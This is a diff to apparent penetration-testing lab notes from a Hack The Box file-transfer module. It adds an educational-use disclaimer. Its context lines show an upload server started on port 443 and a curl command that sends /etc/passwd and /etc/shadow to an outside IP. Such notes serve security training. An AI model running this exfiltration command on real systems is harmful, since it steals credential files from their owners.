@@ -266,3 +266,12 @@ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 Gust4vo@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 
+
+# 🛡️ Disclaimer 
+
+This repository was created **for educational and cybersecurity research purposes only**.  
+The use of any information, scripts, or tools contained herein **is the sole responsibility of the user**.  
+**I am not responsible for any misuse** or activity that violates local laws or third-party policies.
+
+
+© [GSecurity]
